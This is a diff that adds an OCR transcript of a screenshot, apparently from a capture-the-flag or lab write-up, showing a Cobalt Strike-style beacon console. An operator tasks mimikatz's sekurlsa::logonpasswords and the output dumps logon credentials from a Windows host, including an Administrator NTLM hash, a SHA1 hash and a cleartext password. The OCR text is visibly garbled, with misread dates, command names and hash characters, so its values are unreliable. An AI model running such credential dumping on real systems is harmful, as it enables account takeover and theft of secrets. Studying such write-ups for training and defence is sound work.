@@ -1,0 +1,51 @@
+# OCR: f499aaf18ef3ed6a40272a07a9527e9a.jpg
+# 来源: .\02-WriteUp\2024\f499aaf18ef3ed6a40272a07a9527e9a.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:46
+
+85122 67-43:15 UTC [input] <neo> logonpassuords
+85122 87-43:15 UTC [task] <11003, T1055, 11093> Tasked beacon to run mimikatz's sekurlsa:-Logonpassuords command
+05/22 07-43-15 UTC [checkin] host called home, sent: 297594 bytes
+05/22 07-43-16 UTC [output]
+received output-
+Authentication Id : 9 ; 996 (
+Session : Service from 6
+User Name > INDEXUSERS
+Domain : CMS
+Logon Server : (null)
+Logon Time > 2024/5/22 15-25-32
+sID > S-1-5-20
+msv =
+tspkg =
+wdigest -
+* Username = INDEXUSERS
+* Domain = CMS
+* Password = (null)
+kerberos =
+* Username : indexuser$
+* Domain = CMS
+* Password = (null)
+ssp -
+credman =
+Authentication Id : 6 ; 361309 (
+Session : Interactive from 1
+User Name : Administrator
+Domain : INDEXUSER
+Logon Server > INDEXUSER
+Logon Time : 2024/5/22 15-25-39
+SID  S-1-5-21-2557184285-116329523-1948284583-566
+msv =
+[99010000] Credenttalkeys
+* NTLM = 32ed87bdb5fdc5egcba8854737681844
+* SHAL : 6ed5833cf35286ebf8662b7b5949f8d742bbec3f
+[ 63] Primary
+* Username = Administrator
+* Domain “: INDEXUSER
+tspk =
+wdtgest -
+* Username = Administrator
+* Domain = INDEXUSER
+* Password = 123456
+kerberos =
+* Username = Administrator
+* Domain = INDEXUSER
